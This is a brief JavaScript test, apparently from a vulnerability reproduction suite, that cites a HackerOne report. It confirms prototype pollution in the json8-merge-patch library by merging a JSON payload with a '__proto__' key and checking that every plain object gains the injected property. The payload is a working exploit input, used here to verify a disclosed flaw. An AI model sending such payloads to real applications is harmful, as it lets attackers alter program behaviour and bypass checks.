//https://hackerone.com/reports/980649
test("prototype pollution in json8-merge-patch", () => {
  expect({}.polluted).toBe(undefined);

  const json8mergepatch = require("json8-merge-patch");
  json8mergepatch.apply(
    {},
    JSON.parse('{ "__proto__": { "polluted": "yes" }}')
  );

  expect({}.polluted).toBe("yes");
});
